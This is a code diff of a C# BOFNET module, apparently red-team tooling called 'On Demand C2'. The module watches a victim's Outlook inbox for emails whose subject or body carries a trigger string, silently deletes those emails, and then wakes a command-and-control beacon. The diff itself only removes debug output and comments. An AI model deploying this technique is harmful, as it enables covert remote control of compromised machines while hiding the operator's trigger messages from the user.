@@ -1,9 +1,7 @@
 ﻿using BOFNET;
 using Microsoft.Office.Interop.Outlook;
 using System;
-using System.Diagnostics;
 using System.Threading;
-
 
 namespace On_Demand_C2_BOF
 {
@@ -35,13 +33,6 @@ namespace On_Demand_C2_BOF
 
         public override void Go(string[] args)
         {
-            int count = 0;
-            foreach (var item in args)
-            {
-                BeaconConsole.WriteLine($"{count}: {item}");
-                count++;
-            }
-
             if (args.Length != 2)
             {
                 BeaconConsole.WriteLine("wrong args.\r\n" +
@@ -89,7 +80,6 @@ namespace On_Demand_C2_BOF
         private void OnDemandC2_Body_Subscriber(string EntryIDCollection)
         {
             MailItem newMail = (MailItem)app.Session.GetItemFromID(EntryIDCollection, System.Reflection.Missing.Value);
-            //This is a cryptic way to get String.contains("") in case-insensitive way
             if (newMail.Body.IndexOf(OnDemandC2Trigger, StringComparison.OrdinalIgnoreCase) >= 0)
             {
                 newMail.Delete();
@@ -100,15 +90,12 @@ namespace On_Demand_C2_BOF
         private void OnDemandC2_Subject_Subscriber(string EntryIDCollection)
         {
             MailItem newMail = (MailItem)app.Session.GetItemFromID(EntryIDCollection, System.Reflection.Missing.Value);
-            //This is a cryptic way to get String.contains("") in case-insensitive way
             if (newMail.Subject.IndexOf(OnDemandC2Trigger, StringComparison.OrdinalIgnoreCase) >= 0)
             {
                 newMail.Delete();
                 WaitForReply.Set();
             }
         }
-
-
     }
 
 }
